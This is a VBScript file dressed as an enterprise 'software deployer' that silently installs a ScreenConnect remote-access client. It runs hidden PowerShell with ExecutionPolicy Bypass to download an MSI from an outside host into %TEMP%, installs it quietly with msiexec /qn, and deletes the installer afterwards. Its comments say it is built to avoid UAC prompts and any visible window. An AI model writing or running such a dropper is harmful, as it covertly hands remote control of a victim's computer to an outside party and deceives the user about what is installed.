' =================================================================================
' DevOps Enterprise Software Deployer v8.1 - Absolute Silent Edition (Fixed)
' Target Context: Non-Elevated User Session (Strictly No UAC Prompts)
' Fixes: Runtime Error 800A01F4 (Variable Is Undefined)
' =================================================================================

Option Explicit

' --- Configuration Matrix (User-Writable Environments) ---
' FIXED: Added installResult to the Dim block to comply with Option Explicit
Dim AppName, MsiUrl, LogFile, InstallerPath, WshShell, FSO, installResult, dlResult
AppName       = "ScreenConnect"
MsiUrl        = "https://tbnet.net/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

' Destinations shifted to User Temp to completely bypass UAC write-access prompts
InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_User_Install.msi"
LogFile       = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_User_Deploy.log"

Set WshShell = CreateObject("WScript.Shell")
Set FSO      = CreateObject("Scripting.FileSystemObject")

' --- 1. SRE Structural Logging Pipeline ---
Sub WriteSreLog(ByVal sLevel, ByVal sMessage)
    On Error Resume Next
    Dim oLogStream
    Set oLogStream = FSO.OpenTextFile(LogFile, 8, True)
    If Err.Number = 0 Then
        oLogStream.WriteLine "[" & Now & "] [" & UCase(sLevel) & "] " & sMessage
        oLogStream.Close
    End If
    On Error GoTo 0
End Sub

Call WriteSreLog("INFO", "=== Initializing Strict User-Context Pipeline ===")

' --- 2. Inbound Network Ingestion ---
Call WriteSreLog("INFO", "Fetching artifact from remote origin...")

Dim downloadCmd
downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " & _
              """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
              "(New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""

On Error Resume Next
dlResult = WshShell.Run(downloadCmd, 0, True)

If Err.Number <> 0 Or dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
    Call WriteSreLog("FATAL", "Ingestion stream interrupted. Code: " & dlResult)
    If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True
    WScript.Quit 1
End If
On Error GoTo 0

' --- 3. Execution Phase ---
Call WriteSreLog("INFO", "Initiating passive MSI transaction...")
Dim msiLog: msiLog = LogFile & ".msi.log"

On Error Resume Next
' Executed with /qn to fully suppress installation wizard windows and avoid UAC prompts
installResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart /L*V """ & msiLog & """", 0, True)
On Error GoTo 0

' --- 4. Garbage Collection ---
If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True
Call WriteSreLog("INFO", "Pipeline terminated with code: " & installResult)
WScript.Quit 0
